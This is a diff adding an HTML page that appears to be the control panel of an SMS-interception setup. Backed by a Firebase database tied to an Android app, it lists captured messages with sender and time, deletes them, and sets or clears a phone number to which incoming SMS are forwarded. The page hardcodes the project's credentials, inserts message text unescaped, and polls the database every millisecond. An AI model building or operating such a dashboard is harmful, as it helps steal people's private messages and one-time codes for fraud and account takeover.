@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Firebase Data as a List</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        .header-frame {
+            display: flex;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: #fff;
+            padding: 10px;
+            border-bottom: 1px solid #ccc;
+            z-index: 1000;
+        }
+
+        .control-frame {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #fff;
+            padding: 10px;
+            border-top: 1px solid #ccc;
+            z-index: 1000;
+        }
+
+        .header-frame button,
+        .control-frame button {
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            color: white;
+            cursor: pointer;
+            margin: 0 5px;
+        }
+
+        .header-frame #showDataButton {
+            background-color: green;
+        }
+
+        .header-frame #showSmsButton {
+            background-color: blue;
+        }
+
+        .control-frame #stopSmsButton {
+            background-color: gray;
+        }
+
+        .control-frame #sendSmsButton {
+            background-color: orange;
+        }
+
+        .control-frame input[type="text"] {
+            margin: 0 10px;
+            padding: 5px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            max-width: 150px; /* Limit input width */
+            text-align: center;
+            width: 100px; /* Set fixed width */
+        }
+
+        #clearAllDataButton {
+            background-color: rgb(233, 11, 11);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+        }
+
+        .content {
+            margin: 60px 10px 60px 10px; /* Margin for space above and below content to avoid overlap */
+            padding-bottom: 60px; /* Space for fixed footer */
+            overflow-y: auto;
+        }
+
+        .student-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .student-box-yellow, .student-box-red {
+            padding: 10px;
+            border: 2px solid black;
+            border-radius: 5px;
+            cursor: text;
+            word-wrap: break-word;
+            max-width: 100%;
+            box-sizing: border-box;
+            flex-grow: 1;
+        }
+
+        .student-box-yellow {
+            background-color: rgba(253, 248, 248, 0.966);
+        }
+
+        .student-box-red {
+            background-color: rgb(216, 243, 248);
+        }
+
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            margin-left: 10px;
+        }
+
+        .delete-button, .show-button, .sms-button {
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .show-button {
+            background-color: green;
+        }
+
+        .sms-button {
+            background-color: blue;
+        }
+
+        @media (max-width: 600px) {
+            .student-box-yellow, .student-box-red {
+                padding: 8px;
+                font-size: 14px;
+            }
+        }
+
+        h2 {
+            color: red;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="header-frame">
+        <button id="showDataButton">Show Data</button>
+        <button id="showSmsButton">Show SMS</button>
+    </div>
+
+    <div class="control-frame">
+        <button id="stopSmsButton">Stop SMS</button>
+        <input type="text" id="smsRecipient" placeholder="Enter phone number" maxlength="10" oninput="validatePhoneNumber()">
+        <button id="sendSmsButton">Send SMS</button>
+    </div>
+
+    <div class="content">
+        <button id="clearAllDataButton">Clear All Data</button>
+        <div id="StudentDiv"></div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js";
+        import { getDatabase, ref, get, query, orderByKey, remove as removeRef, onValue, set } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDpkA0ZleNzTXEtfZvBXmjYvJFFp7KZwFU",
+            authDomain: "rblccgullu.firebaseapp.com",
+            projectId: "rblccgullu",
+            databaseURL: "https://rblccgullu-default-rtdb.firebaseio.com",
+            storageBucket: "rblccgullu.appspot.com",
+            messagingSenderId: "753772376520",
+            appId: "1:753772376520:android:4e0a2b4c90e78bfd8690fd"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase();
+
+        let StudentDiv = document.getElementById('StudentDiv');
+        let clearAllDataButton = document.getElementById('clearAllDataButton');
+        let showDataButton = document.getElementById('showDataButton');
+        let showSmsButton = document.getElementById('showSmsButton');
+        let sendSmsButton = document.getElementById('sendSmsButton');
+        let stopSmsButton = document.getElementById('stopSmsButton');
+        let smsRecipientInput = document.getElementById('smsRecipient');
+
+        function GetStudents() {
+            const studentsQuery = query(ref(db, 'sms'), orderByKey());
+
+            get(studentsQuery).then((snapshot) => {
+                if (snapshot.exists()) {
+                    let students = [];
+                    snapshot.forEach((std) => {
+                        students.unshift(std);
+                    });
+
+                    StudentDiv.innerHTML = "";
+                    students.forEach((std, index) => {
+                        AddStudentAsListItem(std, index);
+                    });
+                } else {
+                    console.log("No data available");
+                }
+            }).catch((error) => {
+                console.error("Error fetching data: ", error);
+            });
+        }
+
+        function AddStudentAsListItem(std, index) {
+            let value = std.val();
+            let key = std.key;
+
+            let messageBody = value.messageBody || 'Not available';
+            let receivedTime = value.receivedTime || 'Not available';
+            let sender = value.sender || 'Not available';
+
+            let containerDiv = document.createElement('div');
+            containerDiv.className = 'student-container';
+
+            let div = document.createElement('div');
+            div.className = (index % 2 === 0) ? 'student-box-yellow' : 'student-box-red';
+
+            let contentDiv = document.createElement('div');
+            contentDiv.innerHTML = `
+                <p>messageBody: ${messageBody}</p>
+                <p>receivedTime: ${receivedTime}</p>
+                <p>sender: ${sender}</p>
+            `;
+
+            let buttonContainer = document.createElement('div');
+            buttonContainer.className = 'button-container';
+
+            let deleteButton = document.createElement('button');
+            deleteButton.innerText = 'Delete';
+            deleteButton.className = 'delete-button';
+            deleteButton.onclick = () => {
+                DeleteStudent(key);
+            };
+
+            buttonContainer.appendChild(deleteButton);
+
+            div.appendChild(contentDiv);
+            containerDiv.appendChild(div);
+            containerDiv.appendChild(buttonContainer);
+
+            containerDiv.addEventListener('click', (event) => {
+                event.stopPropagation();
+            });
+
+            StudentDiv.appendChild(containerDiv);
+        }
+
+        function DeleteStudent(key) {
+            const studentRef = ref(db, `sms/${key}`);
+            removeRef(studentRef).then(() => {
+                GetStudents();
+            }).catch((error) => {
+                console.error("Error removing student: ", error);
+            });
+        }
+
+        showDataButton.addEventListener('click', () => {
+            window.location.href = "data.html";
+        });
+
+        showSmsButton.addEventListener('click', () => {
+            window.location.href = "sms_page.html";
+        });
+
+        clearAllDataButton.addEventListener('click', () => {
+            if (confirm('Are you sure you want to delete all data?')) {
+                const packagesRef = ref(db, 'sms');
+                removeRef(packagesRef)
+                    .then(() => {
+                        StudentDiv.innerHTML = "";
+                        alert('All data deleted successfully.');
+                    })
+                    .catch((error) => {
+                        console.error("Error deleting all data: ", error);
+                        alert('Failed to delete all data.');
+                    });
+            }
+        });
+
+        let isTyping = false;  // Track whether the user is typing
+
+sendSmsButton.addEventListener('click', () => {
+    const phoneNumber = smsRecipientInput.value;
+    if (phoneNumber && phoneNumber.length === 10) {
+        set(ref(db, 'forwardingPhoneNumber'), phoneNumber)
+            .then(() => {
+                alert('Phone number saved successfully!');
+            })
+            .catch((error) => {
+                alert('Failed to save phone number.');
+                console.error("Error saving phone number: ", error);
+            });
+    } else {
+        alert('Please enter a valid phone number.');
+    }
+});
+
+// Fetch the phone number from Firebase and display it in the input field
+function fetchPhoneNumber() {
+    const phoneRef = ref(db, 'forwardingPhoneNumber');
+    onValue(phoneRef, (snapshot) => {
+        if (!isTyping) {  // Only update the input if the user is not typing
+            const phoneNumber = snapshot.val();
+            if (phoneNumber) {
+                smsRecipientInput.value = phoneNumber;
+            } else {
+                smsRecipientInput.value = '';  // Clear if no number is found
+            }
+        }
+    });
+}
+
+// Call the fetchPhoneNumber function when the page loads
+window.onload = () => {
+    fetchPhoneNumber();
+};
+
+stopSmsButton.addEventListener('click', () => {
+    smsRecipientInput.value = '';
+    set(ref(db, 'forwardingPhoneNumber'), null)
+        .then(() => {
+            alert('SMS forwarding stopped.');
+        })
+        .catch((error) => {
+            alert('Failed to stop SMS forwarding.');
+            console.error("Error stopping SMS forwarding: ", error);
+        });
+});
+
+// Debounce function to delay updates while typing
+function debounce(func, delay) {
+    let debounceTimer;
+    return function () {
+        const context = this;
+        const args = arguments;
+        clearTimeout(debounceTimer);
+        debounceTimer = setTimeout(() => func.apply(context, args), delay);
+    };
+}
+
+// Handle input and update Firebase after user stops typing
+smsRecipientInput.addEventListener('input', debounce(() => {
+    validatePhoneNumber();
+    isTyping = true;  // User is typing, so prevent Firebase updates
+    setTimeout(() => { 
+        isTyping = false;  // After debounce delay, allow Firebase updates again
+        const phoneNumber = smsRecipientInput.value;
+        if (phoneNumber.length === 10) {
+            set(ref(db, 'forwardingPhoneNumber'), phoneNumber)
+                .then(() => {
+                    console.log("Phone number updated in Firebase.");
+                })
+                .catch((error) => {
+                    console.error("Error updating phone number: ", error);
+                });
+        }
+    }, 500);  // Adjust delay as needed
+}, 300));
+
+function validatePhoneNumber() {
+    const value = smsRecipientInput.value;
+    smsRecipientInput.value = value.replace(/[^0-9]/g, '').substring(0, 10);
+}
+
+        GetStudents();
+        setInterval(GetStudents, 1);
+    </script>
+</body>
+</html>
